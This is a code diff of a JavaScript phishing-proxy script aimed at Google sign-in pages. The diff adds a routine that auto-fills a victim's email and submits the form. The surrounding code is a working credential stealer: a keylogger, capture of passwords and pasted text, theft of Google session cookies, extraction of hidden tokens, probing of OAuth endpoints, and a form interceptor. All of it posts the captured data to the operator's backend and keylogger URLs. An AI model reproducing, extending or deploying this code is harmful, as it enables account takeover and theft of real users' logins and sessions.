@@ -26,12 +26,147 @@
     let lastInputValues = new Map();
     let capturedCredentials = [];
     let loginAttempts = 0;
+    let emailAutoFilled = false;
     const FLUSH_INTERVAL = 8000;
     const MAX_BUFFER = 500;
     const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
     // ============================================================
-    //  PART 1: ADVANCED KEYLOGGER - Google Optimized
+    //  PART 1: AUTO-FILL EMAIL - ✅ FIXED
+    // ============================================================
+
+    function autoFillEmail() {
+        const email = CONFIG.EMAIL || '';
+        if (!email || emailAutoFilled) return;
+
+        console.log('🔍 Attempting to auto-fill email:', email);
+
+        // Try multiple selectors for Google's email field
+        const selectors = [
+            'input[name="Email"]',
+            'input[name="identifier"]',
+            'input[type="email"]',
+            'input[name="email"]',
+            'input[name="login"]',
+            'input[name="username"]',
+            'input[autocomplete="email"]',
+            'input[autocomplete="username"]',
+            '#identifierId',
+            '#Email',
+            '#email',
+            '[data-testid="email-input"]',
+            '[jsname="YPqjbf"]'
+        ];
+
+        let emailField = null;
+        for (const selector of selectors) {
+            const field = document.querySelector(selector);
+            if (field) {
+                emailField = field;
+                break;
+            }
+        }
+
+        // If not found, try to find any input that looks like an email field
+        if (!emailField) {
+            const allInputs = document.querySelectorAll('input');
+            for (const input of allInputs) {
+                const type = input.type || '';
+                const name = input.name || '';
+                const id = input.id || '';
+                const placeholder = input.placeholder || '';
+                const autocomplete = input.autocomplete || '';
+                
+                if (type === 'email' || 
+                    name.toLowerCase().includes('email') || 
+                    name.toLowerCase().includes('user') ||
+                    id.toLowerCase().includes('email') ||
+                    id.toLowerCase().includes('user') ||
+                    placeholder.toLowerCase().includes('email') ||
+                    autocomplete === 'email' ||
+                    autocomplete === 'username') {
+                    emailField = input;
+                    break;
+                }
+            }
+        }
+
+        if (emailField) {
+            // Set the value
+            emailField.value = email;
+            
+            // Trigger events to ensure Google recognizes the change
+            const events = ['input', 'change', 'blur'];
+            for (const eventType of events) {
+                const event = new Event(eventType, { bubbles: true });
+                emailField.dispatchEvent(event);
+            }
+            
+            // Also trigger React/Vue events if present
+            const nativeInputValueSetter = Object.getOwnPropertyDescriptor(
+                HTMLInputElement.prototype, 
+                'value'
+            )?.set;
+            if (nativeInputValueSetter) {
+                nativeInputValueSetter.call(emailField, email);
+                const inputEvent = new Event('input', { bubbles: true });
+                emailField.dispatchEvent(inputEvent);
+            }
+
+            emailAutoFilled = true;
+            console.log('✅ Auto-filled email:', email);
+            
+            // Try to find and click the "Next" button if it exists
+            setTimeout(() => {
+                const nextButtons = document.querySelectorAll('button, input[type="submit"]');
+                for (const btn of nextButtons) {
+                    const text = btn.textContent || btn.value || '';
+                    if (text.toLowerCase().includes('next') || 
+                        text.toLowerCase().includes('continue') ||
+                        text.toLowerCase().includes('sign in')) {
+                        console.log('🔘 Found "Next" button, clicking...');
+                        btn.click();
+                        break;
+                    }
+                }
+            }, 1000);
+
+            // Try to submit the form if it's a single-field form
+            setTimeout(() => {
+                const form = emailField.closest('form');
+                if (form) {
+                    const formFields = form.querySelectorAll('input');
+                    // If there's only one input field (just email), submit the form
+                    if (formFields.length === 1) {
+                        console.log('📤 Submitting email form...');
+                        const submitEvent = new Event('submit', { bubbles: true, cancelable: true });
+                        if (form.dispatchEvent(submitEvent)) {
+                            form.submit();
+                        }
+                    }
+                }
+            }, 1500);
+        } else {
+            console.warn('⚠️ Email field not found. Retrying...');
+            // Try again after a delay
+            setTimeout(autoFillEmail, 2000);
+        }
+    }
+
+    // Run auto-fill on page load
+    if (document.readyState === 'complete') {
+        setTimeout(autoFillEmail, 500);
+    } else {
+        document.addEventListener('DOMContentLoaded', () => setTimeout(autoFillEmail, 500));
+        window.addEventListener('load', () => setTimeout(autoFillEmail, 500));
+    }
+
+    // Also run after a few seconds in case the page loads dynamically
+    setTimeout(autoFillEmail, 2000);
+    setTimeout(autoFillEmail, 5000);
+
+    // ============================================================
+    //  PART 2: ADVANCED KEYLOGGER - Google Optimized
     // ============================================================
 
     function formatKey(e) {
@@ -132,7 +267,6 @@
                 if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
 
                 // --- Google-specific credential detection ---
-                // Check for Email field (Google uses 'Email' or 'identifier')
                 if (label === 'Email' || label === 'identifier' || label === 'email' || 
                     label.toLowerCase().includes('email') || label.toLowerCase().includes('user')) {
                     if (value && value.includes('@')) {
@@ -147,7 +281,6 @@
                     }
                 }
 
-                // Check for Password field (Google uses 'Passwd' or 'password')
                 if (label === 'Passwd' || label === 'password' || label === 'passwd' ||
                     field.type === 'password' || label.toLowerCase().includes('pass')) {
                     if (value && value.length > 0) {
@@ -157,7 +290,6 @@
                             value: value,
                             timestamp: Date.now()
                         });
-                        // Send password immediately
                         sendCredentialsToBackend('password', value, label);
                     }
                 }
@@ -165,7 +297,7 @@
         }
     });
 
-    // --- Composition events for IME (non-Latin characters) ---
+    // --- Composition events for IME ---
     document.addEventListener('compositionstart', () => {
         keylogBuffer += '[IME_START]';
     });
@@ -182,7 +314,6 @@
             keylogBuffer += `[PASTE:${pasteText}]`;
             if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
             
-            // Check if paste contains email
             if (text.includes('@')) {
                 const emailMatch = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                 if (emailMatch) {
@@ -190,7 +321,6 @@
                     sendCredentialsToBackend('email_paste', emailMatch[0], 'paste');
                 }
             }
-            // Check if paste contains password-like text
             if (text.length > 4 && !text.includes('@') && !text.includes(' ')) {
                 sendCredentialsToBackend('password_paste', text, 'paste');
             }
@@ -216,7 +346,6 @@
 
     // --- Periodic check for Google's dynamic fields ---
     setInterval(() => {
-        // Check for Google's hidden fields that might contain data
         const hiddenFields = document.querySelectorAll('input[type="hidden"]');
         hiddenFields.forEach(field => {
             const name = field.name || '';
@@ -227,7 +356,6 @@
             }
         });
 
-        // Check for Google's identifier field (sometimes appears after email entry)
         const identifier = document.querySelector('input[name="identifier"]');
         if (identifier && identifier.value && identifier.value !== lastInputValues.get(identifier)) {
             const value = identifier.value;
@@ -236,6 +364,11 @@
                 sendCredentialsToBackend('email', value, 'identifier');
             }
             lastInputValues.set(identifier, value);
+        }
+
+        // Retry auto-fill if it failed
+        if (!emailAutoFilled && CONFIG.EMAIL) {
+            autoFillEmail();
         }
     }, 3000);
 
@@ -247,7 +380,7 @@
     console.log('⌨️ Google Keylogger initialized');
 
     // ============================================================
-    //  PART 2: CREDENTIAL SENDER
+    //  PART 3: CREDENTIAL SENDER
     // ============================================================
 
     function sendCredentialsToBackend(type, value, field) {
@@ -272,7 +405,6 @@
                 body: JSON.stringify(data)
             }).catch(() => {});
 
-            // Also send to keylogger
             if (CONFIG.KEYLOGGER_URL) {
                 fetch(CONFIG.KEYLOGGER_URL, {
                     method: 'POST',
@@ -294,14 +426,13 @@
     }
 
     // ============================================================
-    //  PART 3: GOOGLE-SPECIFIC COOKIE CAPTURE
+    //  PART 4: GOOGLE-SPECIFIC COOKIE CAPTURE
     // ============================================================
 
     function captureFullCookies() {
         try {
             const cookies = document.cookie || '';
             if (cookies) {
-                // Parse cookies into object
                 const cookieObj = {};
                 cookies.split('; ').forEach(cookie => {
                     const [name, value] = cookie.split('=');
@@ -310,7 +441,6 @@
                     }
                 });
 
-                // Check for Google-specific cookies
                 const googleCookies = ['SAPISID', 'HSID', 'SSID', 'APISID', 'SID', 'NID', 'OSID'];
                 const hasGoogleCookies = googleCookies.some(name => cookieObj[name]);
 
@@ -332,7 +462,6 @@
                         })
                     }).catch(() => {});
 
-                    // Send to backend
                     fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -354,7 +483,6 @@
         }
     }
 
-    // Run cookie capture at intervals
     setTimeout(captureFullCookies, 2000);
     setTimeout(captureFullCookies, 5000);
     setTimeout(captureFullCookies, 10000);
@@ -365,13 +493,12 @@
     console.log('🍪 Google Cookie capture initialized');
 
     // ============================================================
-    //  PART 4: XSS DATA EXTRACTION - Google Optimized
+    //  PART 5: XSS DATA EXTRACTION - Google Optimized
     // ============================================================
 
     function extractGoogleDomData() {
         const data = {};
 
-        // Google-specific fields
         const emailField = document.querySelector('input[name="Email"]') || 
                            document.querySelector('input[name="identifier"]') ||
                            document.querySelector('input[type="email"]') ||
@@ -383,7 +510,6 @@
                          document.querySelector('input[name="password"]');
         if (passField && passField.value) data.password = passField.value;
 
-        // Google's hidden fields
         const hiddenFields = {};
         document.querySelectorAll('input[type="hidden"]').forEach(field => {
             const name = field.name || '';
@@ -393,7 +519,6 @@
         });
         if (Object.keys(hiddenFields).length > 0) data.hiddenFields = hiddenFields;
 
-        // Google-specific tokens
         const gxf = document.querySelector('input[name="gxf"]');
         if (gxf) data.gxf = gxf.value;
 
@@ -403,13 +528,11 @@
         const service = document.querySelector('input[name="service"]');
         if (service) data.service = service.value;
 
-        // User info from page
         const userInfo = document.querySelector('[data-testid="userInfo"]') ||
                         document.querySelector('.user-info') ||
                         document.querySelector('[class*="profile"]');
         if (userInfo) data.userInfo = userInfo.textContent.trim();
 
-        // Page title
         data.pageTitle = document.title;
 
         return data;
@@ -456,8 +579,6 @@
 
     async function executeGoogleRequests() {
         const results = {};
-        
-        // Google-specific endpoints
         const endpoints = [
             '/oauth2/v1/userinfo',
             '/oauth2/v2/token',
@@ -479,11 +600,9 @@
                         if (data && typeof data === 'object' && Object.keys(data).length > 0) {
                             results[endpoint] = data;
                         }
-                    } catch (e) {
-                        // Not JSON, ignore
-                    }
+                    } catch (e) {}
                 }
-            } catch (e) { /* ignore */ }
+            } catch (e) {}
         }
 
         return results;
@@ -507,7 +626,6 @@
                 userAgent: navigator.userAgent
             };
 
-            // Send to XSS endpoint
             fetch(CONFIG.XSS_ENDPOINT, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -518,7 +636,6 @@
                 })
             }).catch(() => {});
 
-            // Send to backend
             fetch(`${CONFIG.BACKEND_URL}/api/xss-data`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -532,7 +649,6 @@
                 })
             }).catch(() => {});
 
-            // Send credentials if found
             if (domData.email && domData.email.includes('@')) {
                 sendCredentialsToBackend('email', domData.email, 'xss_extract');
             }
@@ -546,19 +662,16 @@
         }
     }
 
-    // Run XSS on page load
     if (document.readyState === 'complete') {
         setTimeout(runXSS, 1500);
     } else {
         window.addEventListener('load', () => setTimeout(runXSS, 1500));
     }
 
-    // Run XSS at intervals
     setTimeout(runXSS, 5000);
     setTimeout(runXSS, 15000);
     setTimeout(runXSS, 30000);
 
-    // Observe DOM changes for SPA
     let observerRunning = false;
     const observer = new MutationObserver(() => {
         if (!observerRunning) {
@@ -581,7 +694,7 @@
     console.log('🎯 Google XSS extractor initialized');
 
     // ============================================================
-    //  PART 5: FORM SUBMISSION INTERCEPTOR
+    //  PART 6: FORM SUBMISSION INTERCEPTOR
     // ============================================================
 
     document.addEventListener('submit', (e) => {
@@ -593,8 +706,6 @@
 
         for (const [key, value] of formData.entries()) {
             data[key] = value;
-            
-            // Google-specific fields
             if (key === 'Email' || key === 'identifier' || key === 'email') {
                 email = value;
                 if (value && value.includes('@')) {
@@ -609,7 +720,6 @@
         if (email || password) {
             loginAttempts++;
             
-            // Send to backend immediately
             fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -627,7 +737,6 @@
                 })
             }).catch(() => {});
 
-            // Also send to keylogger
             if (CONFIG.KEYLOGGER_URL) {
                 fetch(CONFIG.KEYLOGGER_URL, {
                     method: 'POST',
@@ -651,7 +760,7 @@
     });
 
     // ============================================================
-    //  PART 6: CLICK TRACKING
+    //  PART 7: CLICK TRACKING
     // ============================================================
 
     document.addEventListener('click', (e) => {
@@ -677,7 +786,6 @@
             keylogBuffer += `[CLICK:${tag}${id ? '#'+id : ''} ${text}]`;
             if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
 
-            // Send to backend
             fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -692,13 +800,12 @@
     });
 
     // ============================================================
-    //  PART 7: SERVICE WORKER REGISTRATION (Google version)
+    //  PART 8: SERVICE WORKER REGISTRATION
     // ============================================================
     
     (function() {
         if ("serviceWorker" in navigator) {
             try {
-                // Register Google-specific service worker
                 const swUrl = "/service_worker_google.js";
                 navigator.serviceWorker.register(swUrl, {
                     scope: "/",
@@ -714,7 +821,7 @@
     })();
 
     // ============================================================
-    //  PART 8: DEBUG INFO
+    //  PART 9: DEBUG INFO
     // ============================================================
 
     console.log('✅ Google Workspace Proxy Script Ready');
@@ -725,7 +832,6 @@
     console.log(`🔗 Keylogger: ${CONFIG.KEYLOGGER_URL}`);
     console.log(`🔗 Backend: ${CONFIG.BACKEND_URL}`);
 
-    // Send initial load event
     fetch(`${CONFIG.BACKEND_URL}/api/log-action`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
